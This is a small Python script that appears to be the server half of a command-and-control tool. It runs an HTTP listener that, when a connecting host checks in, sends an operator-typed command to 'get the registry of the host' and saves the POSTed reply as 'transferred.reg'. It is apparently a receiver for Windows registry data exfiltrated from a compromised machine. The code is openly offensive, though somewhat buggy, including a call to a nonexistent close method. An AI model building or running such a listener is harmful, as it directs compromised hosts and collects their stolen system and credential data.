#Import statements
import socket as sock
import http.server as Serv
import socketserver
import sys

#Allows for program termination
def signal_handler():
  print("crtl-c was hit")
  sys.exit(0)

#Handles all http requests
class httpHandler(Serv.SimpleHTTPRequestHandler):

  #Gets
  def do_GET(self):
    command = input("Connection Established.\nPress enter to get the registry of the host\n\n>")
    #Prompts user to prepare for request
    self.send_response(200) #Sends HTTP status code 200 (OK)
    self.send_header("Content-Type", "text/html")  #Sets content type to text
    self.end_headers()
    self.wfile.write(bytes(command, "utf-16"))

  def do_POST(self):
    self.send_response(200)
    self.end_headers()
    content_len = int(self.headers['Content-Length'])
    print("Content length: {}".format(content_len))
    #results = s.rfile.read(content_len)
    with open("transferred.reg", "wb") as f:
      f.write(self.rfile.read(content_len))


if __name__ == '__main__':
  try:
    myHandler = httpHandler
    serv_sock = socketserver.TCPServer(('localhost', 80), myHandler)
    while True:
      serv_sock.serve_forever()
    print("Closing Connection")
    serv_sock.server_close_connection()
  except KeyboardInterrupt:
    print("ctrl-c was hit")
    serv_sock.server_close()
